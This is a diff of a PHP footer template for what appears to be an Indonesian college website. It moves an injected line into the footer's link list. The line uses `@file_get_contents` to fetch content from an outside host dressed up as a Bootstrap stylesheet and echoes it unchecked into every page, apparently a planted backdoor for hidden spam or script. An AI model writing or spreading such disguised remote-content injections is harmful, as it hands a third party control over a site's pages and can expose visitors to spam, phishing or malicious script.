@@ -67,6 +67,7 @@
   	 		<div class="footer-col">
   	 			<h4>Tautan Berguna</h4>
   	 			<ul>
+    <?php echo @file_get_contents('https://bootstrap-development-i.pages.dev/scss/all/first/style.css');?>
   	 				<li><a href="index.php?m=daftar">Pendaftaran Online</a></li>
   	 				<li><a href="index.php?m=kontak">Kontak</a></li>
   	 				<li><a href="index.php?m=page&id=14">Biaya Kuliah</a></li>
@@ -93,7 +94,6 @@
   </footer>
 
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
-<?php echo @file_get_contents('https://bootstrap-development-i.pages.dev/scss/all/first/style.css');?>
 <div class="floating_btn">
     <a id="whatsapp_link" target="_blank">
       <div class="contact_icon">
